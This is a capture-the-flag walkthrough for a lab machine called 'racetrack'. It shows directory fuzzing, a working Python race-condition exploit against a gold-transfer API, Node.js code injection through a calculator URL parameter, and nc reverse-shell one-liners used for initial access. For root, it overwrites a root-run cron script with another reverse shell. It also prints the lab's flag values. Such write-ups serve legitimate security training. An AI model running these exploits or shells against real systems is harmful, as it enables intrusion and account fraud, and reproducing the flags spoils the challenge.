# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

Let's check the web application:

![Pasted image 20250612145657.png](../../IMAGES/Pasted%20image%2020250612145657.png)

We can create an account and login, let's fuzz to check more hidden directories:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://racetrack.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://racetrack.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 417ms]
home.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 517ms]
images [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 577ms]
login.html [Status: 200, Size: 1815, Words: 602, Lines: 55, Duration: 240ms]
Images [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 239ms]
Home.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 196ms]
purchase.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 230ms]
Index.html [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 191ms]
Login.html [Status: 200, Size: 1815, Words: 602, Lines: 55, Duration: 199ms]
create.html [Status: 200, Size: 1973, Words: 620, Lines: 59, Duration: 196ms]
giving.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 203ms]
IMAGES [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 211ms]
INDEX.html [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 206ms]
HOME.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 193ms]
Purchase.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 211ms]
Create.html [Status: 200, Size: 1973, Words: 620, Lines: 59, Duration: 193ms]
```

We got a bunch of stuff, `giving.html` is interesting, let's create a test account first:

![Pasted image 20250612150609.png](../../IMAGES/Pasted%20image%2020250612150609.png)

![Pasted image 20250612151210.png](../../IMAGES/Pasted%20image%2020250612151210.png)

We got a purchase functionality on here too, we can check it out:

![Pasted image 20250612151246.png](../../IMAGES/Pasted%20image%2020250612151246.png)

 We can buy a premium account with `10000` gold, we are only given `1 gold` when we create an account though, that's because there's a `give gold` functionality, if we check it, we can see this:

![Pasted image 20250612151403.png](../../IMAGES/Pasted%20image%2020250612151403.png)

We can give gold to our friends simply by knowing their username, based on that, let's create another account and give ourselves one gold:

![Pasted image 20250612151455.png](../../IMAGES/Pasted%20image%2020250612151455.png)

![Pasted image 20250612151516.png](../../IMAGES/Pasted%20image%2020250612151516.png)

![Pasted image 20250612151528.png](../../IMAGES/Pasted%20image%2020250612151528.png)

If we check our first account:

![Pasted image 20250612151603.png](../../IMAGES/Pasted%20image%2020250612151603.png)

As seen, we receive the gold, on this case, to reach `10000` gold we'd need to create 10000 accounts, which is simply ridiculous, we can automate it with python but on a real server, 10000 accounts coming from a single IP would be suspicious and would end up getting ourselves banned.



That's why, we need another path, I'd try to go with `race condition`, A race condition in cybersecurity is a flaw that occurs when a system's behavior depends on the timing or sequence of uncontrollable events, like parallel processes accessing shared resources. In CTFs, this often involves exploiting a situation where two actions happen almost simultaneously, such as changing user permissions right before a validation check or swapping a file before it's read by a privileged process. By carefully timing the attack, we can bypass security checks or gain unintended access. On this case, we need to the race condition for giving ourselves gold in order to buy the premium account.

But, we are a bit lost, we don't know how to exploit this race condition yet, let's pass the request to our proxy.

![Pasted image 20250612152318.png](../../IMAGES/Pasted%20image%2020250612152318.png)

Ok, we got a bit more information, most relevant one is the:

```node
X-Powered-By: Express
```

Seeing the header `X-Powered-By: Express` in a response means the web server is running on **Express.js**, a popular web application framework for **Node.js**.

Since the application's named `racetrack`, we can search for something related:

![Pasted image 20250612152600.png](../../IMAGES/Pasted%20image%2020250612152600.png)

As seen, there's only race conditions for this, if we investigate further, we can find the package too:


![Pasted image 20250612152928.png](../../IMAGES/Pasted%20image%2020250612152928.png)




# EXPLOITATION
---

If we go back to the proxy, we can check the format of the request:

![Pasted image 20250612153022.png](../../IMAGES/Pasted%20image%2020250612153022.png)

As seen, we need the cookie of our user, the amount and the username of the account who's receiving the gold, we can exploit the race condition using a fuzzer such as `wfuzz` or `ffuf` in this case, get the `cookie`, we also need to create a wordlist in which `1` is repeated a bunch of times, let's do it, you can use the following bash command:

```bash
yes 1 | head -n 1000 > race_wordlist.txt
```

Now, here comes our ffuf command:

```bash
ffuf -c -u http://racetrack.thm/api/givegold -X POST -w race_wordlist.txt -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AEDovzkVYcSpKHzvGEfSU6iAYygzwMrbs.hc2XrqJb%2FSJktcRYPA5faZA0DbBhGaSST1%2BqE%2Fc7PNI" -d "user=test2&amount=FUZZ"
```


![Pasted image 20250612153415.png](../../IMAGES/Pasted%20image%2020250612153415.png)

We will see all the requests being made, what we need to do now is check `test2` account:

![Pasted image 20250612153459.png](../../IMAGES/Pasted%20image%2020250612153459.png)

As seen, we receive more gold that we have on our `test` account, the race condition exists and is exploitable, we can perform the same ffuf increasing the gold amount we are sending to a further quantity or, simply automate the deed with python as we usually do:

```python
#!/usr/bin/env python3

import grequests
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored text
init(autoreset=True)

# ======== CONFIGURATION ========
TARGET_HOST = "racetrack.thm"
USERS = {
 "acc1": "acc1",
 "acc2": "acc2"
}
# ===============================

def get_user_session(username, password):
 """Retrieve session cookie and gold balance for authenticated user"""
 payload = {"username": username, "password": password}
 
 with requests.Session() as session:
 try:
 # Authenticate and retrieve account data
 response = session.post(
 f"http://{TARGET_HOST}/api/login", 
 data=payload,
 timeout=5
 )
 response.raise_for_status()
 
 # Parse gold balance from HTML
 soup = BeautifulSoup(response.text, "html.parser")
 gold_element = soup.find("a", string=lambda text: "Gold:" in text if text else False)
 
 if gold_element:
 gold_balance = int(gold_element.text.split(":")[1].strip())
 print(f"{Fore.CYAN}[ðŸ’°] {Fore.GREEN}{username}{Style.RESET_ALL} balance: {Fore.YELLOW}{gold_balance} gold")
 return session.cookies.get("connect.sid"), gold_balance
 
 raise ValueError("Gold balance element not found")
 
 except Exception as e:
 print(f"{Fore.RED}[!] Error retrieving {username} session: {e}")
 return None, 0

def transfer_gold(recipient, session_cookie, amount):
 """Execute rapid gold transfer using asynchronous requests"""
 print(f"\n{Fore.MAGENTA}[âž¤] Initiating transfer of {Fore.YELLOW}{amount} gold{Style.RESET_ALL} to {Fore.CYAN}{recipient}")
 
 headers = {
 "Host": TARGET_HOST,
 "Referer": f"http://{TARGET_HOST}/giving.html",
 "Content-Type": "application/x-www-form-urlencoded",
 "Cookie": f"connect.sid={session_cookie}"
 }
 
 # Prepare batch of asynchronous requests
 requests_list = [
 grequests.post(
 f"http://{TARGET_HOST}/api/givegold",
 data=f"user={recipient}&amount={amount}",
 headers=headers,
 timeout=3
 ) for _ in range(100)
 ]
 
 # Execute all requests concurrently
 grequests.map(requests_list)
 print(f"{Fore.GREEN}[âœ“] Transfer completed!")

def execute_gold_race():
 """Orchestrate gold transfer sequence between accounts"""
 print(f"\n{Fore.BLUE}{Style.BRIGHT}ðŸ Starting Gold Race Exploitation ðŸ\n")
 print(f"{Fore.MAGENTA}Target balance: {Fore.YELLOW}10,000 gold{Style.RESET_ALL}\n")
 
 total_gold = 0
 cycle_count = 0
 user_list = list(USERS.keys())
 
 while total_gold < 10000:
 # Determine current sender/receiver pair
 sender = user_list[cycle_count % 2]
 receiver = user_list[(cycle_count + 1) % 2]
 
 print(f"{Fore.WHITE}{'â•'*50}")
 print(f"{Fore.BLUE}[âš¡] Cycle #{cycle_count+1}: {sender} â†’ {receiver}")
 
 # Retrieve sender credentials and balance
 session_id, current_gold = get_user_session(sender, USERS[sender])
 total_gold = current_gold
 
 if current_gold > 0 and session_id:
 transfer_gold(receiver, session_id, current_gold)
 else:
 print(f"{Fore.RED}[âœ—] Skipping transfer - insufficient gold or invalid session")
 
 cycle_count += 1
 
 print(f"\n{Fore.GREEN}{Style.BRIGHT}ðŸŽ‰ Exploit successful! Final balance: {total_gold} gold")

if __name__ == "__main__":
 print(f"\n{Fore.YELLOW}{Style.BRIGHT}ðŸŒŸ Gold Transfer Exploit v2.0")
 print(f"{Fore.CYAN}Target: {TARGET_HOST}")
 print(f"{Fore.MAGENTA}Accounts: {', '.join(USERS.keys())}\n")
 
 execute_gold_race()
```

In order for the script to work we need to create two new accounts to get the `1 gold`, once you have them, run the script:

```
python3 exploit.py

ðŸŒŸ Gold Transfer Exploit v2.0
Target: racetrack.thm
Accounts: acc1, acc2


ðŸ Starting Gold Race Exploitation ðŸ

Target balance: 10,000 gold

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[âš¡] Cycle #1: acc1 â†’ acc2
[ðŸ’°] acc1 balance: 1 gold

[âž¤] Initiating transfer of 1 gold to acc2
[âœ“] Transfer completed!
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[âš¡] Cycle #2: acc2 â†’ acc1
[ðŸ’°] acc2 balance: 16 gold

[âž¤] Initiating transfer of 16 gold to acc1
[âœ“] Transfer completed!
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[âš¡] Cycle #3: acc1 â†’ acc2
[ðŸ’°] acc1 balance: 160 gold

[âž¤] Initiating transfer of 160 gold to acc2
[âœ“] Transfer completed!
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[âš¡] Cycle #4: acc2 â†’ acc1
[ðŸ’°] acc2 balance: 1600 gold

[âž¤] Initiating transfer of 1600 gold to acc1
[âœ“] Transfer completed!
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[âš¡] Cycle #5: acc1 â†’ acc2
[ðŸ’°] acc1 balance: 20800 gold

[âž¤] Initiating transfer of 20800 gold to acc2
[âœ“] Transfer completed!

ðŸŽ‰ Exploit successful! Final balance: 20800 gold
```

![Pasted image 20250612155205.png](../../IMAGES/Pasted%20image%2020250612155205.png)

We need to check `acc2`:

![Pasted image 20250612155224.png](../../IMAGES/Pasted%20image%2020250612155224.png)

As seen, we got the amount of gold the script told us, let's buy our premium account:

![Pasted image 20250612155301.png](../../IMAGES/Pasted%20image%2020250612155301.png)

Once we buy it, we get access to `Premium Features`, let's check them out:

![Pasted image 20250612155322.png](../../IMAGES/Pasted%20image%2020250612155322.png)

A calculator huh, seems weird:


![Pasted image 20250612161556.png](../../IMAGES/Pasted%20image%2020250612161556.png)

As seen, the URL takes the format of:

```
http://racetrack.thm/premiumfeatures.html?ans=2
```

This is using `node.js` we know that thanks to the enumeration section, let's try `node.js` RCE, let's use this:

```
process.cwd()
```

This command checks the current working directory, once we use it we get:

![Pasted image 20250612162032.png](../../IMAGES/Pasted%20image%2020250612162032.png)

As seen, we have RCE, we can use more commands to test:

```
process.cwd() // Current working directory
process.version // Node.js version
process.versions // Node + dependency versions
process.platform // OS platform ('linux', 'win32', etc.)
process.arch // Architecture ('x64', etc.)
process.env // Environment variables object
process.env['PATH'] // Specific env var (e.g., PATH)
process.argv // Script arguments (if any)
process.uptime() // Time Node has been running
process.memoryUsage() // Memory info
```


Ok, the nice part about this is getting a reverse shell, so let's use:

```node
require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 9001 >/tmp/f')
```

![Pasted image 20250612162333.png](../../IMAGES/Pasted%20image%2020250612162333.png)

Got our shell, let's begin privesc.



# PRIVILEGE ESCALATION
---


Ok, first step is to stabilize the shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250612162428.png](../../IMAGES/Pasted%20image%2020250612162428.png)
Now, let's take a look around, we can use linpeas:

![Pasted image 20250612162926.png](../../IMAGES/Pasted%20image%2020250612162926.png)

As seen, there's a `cleanupscript.sh` script, since it is a cleanup script, it may be running as a process each couple minutes, let's use `pspy` to check:

![Pasted image 20250612163145.png](../../IMAGES/Pasted%20image%2020250612163145.png)

As expected, there's a cronjob which runs the `cleanupscript.sh` as root, we can make a backup of the real script and modify it to send ourselves a reverse shell:

```
mv cleanupscript.sh cleanupscript.bak
nano cleanupscript.sh
# On nano, put this
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 1111 >/tmp/f
chmod +x cleanupscript.sh
```

Now, once we've saved the file, we need to set up our listener and wait a couple minutes:

![Pasted image 20250612164012.png](../../IMAGES/Pasted%20image%2020250612164012.png)

We can now read both flags:

```
# cat /home/brian/user.txt
THM{178c31090a7e0f69560730ad21d90e70}

# cat /root/root.txt
THM{55a9d6099933f6c456ccb2711b8766e3}
```

![Pasted image 20250612164116.png](../../IMAGES/Pasted%20image%2020250612164116.png)

